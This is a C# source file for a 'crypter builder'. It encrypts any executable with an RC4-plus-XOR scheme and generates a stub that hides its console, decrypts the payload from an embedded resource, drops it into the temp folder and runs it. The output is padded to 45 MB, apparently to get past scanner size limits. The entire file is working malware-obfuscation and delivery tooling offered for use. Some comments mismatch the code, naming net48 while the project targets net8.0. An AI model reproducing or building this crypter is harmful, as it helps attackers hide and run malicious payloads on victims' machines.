using System;
using System.IO;
using System.Diagnostics;
using System.Security.Cryptography;

class Builder
{
    private static byte[] RC4(byte[] data, byte[] key)
    {
        byte[] s = new byte[256];
        for (int i = 0; i < 256; i++) s[i] = (byte)i;

        int j = 0;
        for (int i = 0; i < 256; i++)
        {
            j = (j + s[i] + key[i % key.Length]) % 256;
            (s[i], s[j]) = (s[j], s[i]);
        }

        byte[] result = new byte[data.Length];
        int a = 0, b = 0;
        for (int x = 0; x < data.Length; x++)
        {
            a = (a + 1) % 256;
            b = (b + s[a]) % 256;
            (s[a], s[b]) = (s[b], s[a]);
            result[x] = (byte)(data[x] ^ s[(s[a] + s[b]) % 256] ^ key[x % key.Length]);
        }
        return result;
    }

    static void Main(string[] args)
    {
        Console.WriteLine("=== RC4+XOR .NET Crypter Builder ===");
        if (args.Length < 1)
        {
            Console.WriteLine("Usage: crypter_builder.exe <payload.exe>");
            return;
        }

        string payloadPath = Path.GetFullPath(args[0]);
        if (!File.Exists(payloadPath))
        {
            Console.WriteLine($"[-] Payload not found: {payloadPath}");
            return;
        }

        byte[] payloadData = File.ReadAllBytes(payloadPath);
        Console.WriteLine($"[*] Loaded payload: {payloadPath} ({payloadData.Length:N0} bytes)");

        
        byte[] key = new byte[16];
        using (var rng = RandomNumberGenerator.Create())
        {
            rng.GetBytes(key);
        }
        Console.WriteLine($"[+] Generated RC4 Key: [{string.Join(", ", key)}]");

        
        byte[] encrypted = RC4(payloadData, key);

        
        string stubDir = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "StubWorkspace");
        if (Directory.Exists(stubDir))
        {
            Directory.Delete(stubDir, true);
        }
        Directory.CreateDirectory(stubDir);

        
        string resourcePath = Path.Combine(stubDir, "r");
        File.WriteAllBytes(resourcePath, encrypted);
        Console.WriteLine($"[+] Saved encrypted payload as resource 'r'");

        
        string stubCode = $@"
using System;
using System.IO;
using System.Reflection;
using System.Diagnostics;
using System.Runtime.InteropServices;

class Program
{{
    [DllImport(""user32.dll"")]
    static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    [DllImport(""kernel32.dll"")]
    static extern IntPtr GetConsoleWindow();

    static void Main()
    {{
        // Hide console window
        ShowWindow(GetConsoleWindow(), 0);

        // 16-byte RC4 Key
        byte[] key = new byte[] {{ {string.Join(", ", key)} }};
        
        // Extract resource
        byte[] r = null;
        using (Stream s = Assembly.GetExecutingAssembly().GetManifestResourceStream(""r""))
        {{
            r = new byte[s.Length];
            s.Read(r, 0, r.Length);
        }}

        // KSA
        byte[] sBox = new byte[256];
        for (int i = 0; i < 256; i++) sBox[i] = (byte)i;
        int j = 0;
        for (int i = 0; i < 256; i++)
        {{
            j = (j + sBox[i] + key[i % 16]) % 256;
            byte temp = sBox[i]; sBox[i] = sBox[j]; sBox[j] = temp;
        }}

        // PRGA (Double XOR)
        byte[] dec = new byte[r.Length];
        int a = 0, b = 0;
        for (int x = 0; x < r.Length; x++)
        {{
            a = (a + 1) % 256;
            b = (b + sBox[a]) % 256;
            byte temp = sBox[a]; sBox[a] = sBox[b]; sBox[b] = temp;
            
            // The signature: data ^ keystream ^ key
            dec[x] = (byte)(r[x] ^ sBox[(sBox[a] + sBox[b]) % 256] ^ key[x % 16]);
        }}

        // Drop and Execute
        string dropPath = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString() + "".exe"");
        File.WriteAllBytes(dropPath, dec);

        ProcessStartInfo psi = new ProcessStartInfo
        {{
            FileName = dropPath,
            UseShellExecute = false
        }};
        Process.Start(psi);
    }}
}}";
        File.WriteAllText(Path.Combine(stubDir, "Program.cs"), stubCode);
        Console.WriteLine("[+] Generated crypter stub source code (p.dll logic)");

        
        string csproj = @"<Project Sdk=""Microsoft.NET.Sdk"">
	<PropertyGroup>
		<OutputType>WinExe</OutputType>
		<TargetFramework>net8.0-windows</TargetFramework>
		<UseWindowsForms>true</UseWindowsForms>
		<RuntimeIdentifier>win-x64</RuntimeIdentifier>
		<SelfContained>false</SelfContained>
		<PublishSingleFile>true</PublishSingleFile>
		<DebugType>none</DebugType>
		<DebugSymbols>false</DebugSymbols>
		<GenerateAssemblyInfo>false</GenerateAssemblyInfo>
	</PropertyGroup>
	<ItemGroup>
		<EmbeddedResource Include=""r"">
			<LogicalName>r</LogicalName>
		</EmbeddedResource>
	</ItemGroup>
</Project>";
        File.WriteAllText(Path.Combine(stubDir, "stub.csproj"), csproj);
        Console.WriteLine("[+] Generated custom net48 project file");

        
        Console.WriteLine("[*] Compiling stub...");
        ProcessStartInfo p = new ProcessStartInfo("dotnet", "publish -c Release -r win-x64");
        p.WorkingDirectory = stubDir;
        p.UseShellExecute = false;
        
        var proc = Process.Start(p);
        proc.WaitForExit();

        if (proc.ExitCode == 0)
        {
            string outPath = Path.Combine(stubDir, "bin", "Release", "net8.0-windows", "win-x64", "publish", "stub.exe"); // assembly name is default to project name 'stub'
            if (File.Exists(outPath))
            {
                string finalPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "crypt.exe");
                File.Copy(outPath, finalPath, true);
                
                
                long targetSize = 47_185_920; 
                FileInfo fi = new FileInfo(finalPath);
                if (fi.Length < targetSize)
                {
                    Console.WriteLine($"[*] Padding executable to reach 45MB (Current: {fi.Length / 1024 / 1024}MB)...");
                    using (FileStream fs = new FileStream(finalPath, FileMode.Append, FileAccess.Write))
                    {
                        byte[] padding = new byte[1024 * 1024]; 
                        while (fs.Length < targetSize)
                        {
                            long remaining = targetSize - fs.Length;
                            fs.Write(padding, 0, (int)Math.Min(padding.Length, remaining));
                        }
                    }
                }

                Console.WriteLine($"\n[+] Success! Crypter bundle saved to: {finalPath}");
                Console.WriteLine($"[+] Final Size: {new FileInfo(finalPath).Length / 1024 / 1024} MB");
                

                try { Directory.Delete(stubDir, true); } catch { }
            }
        }
        else
        {
            Console.WriteLine("[-] Build failed. Ensure .NET SDK supports net48.");
        }
    }
}
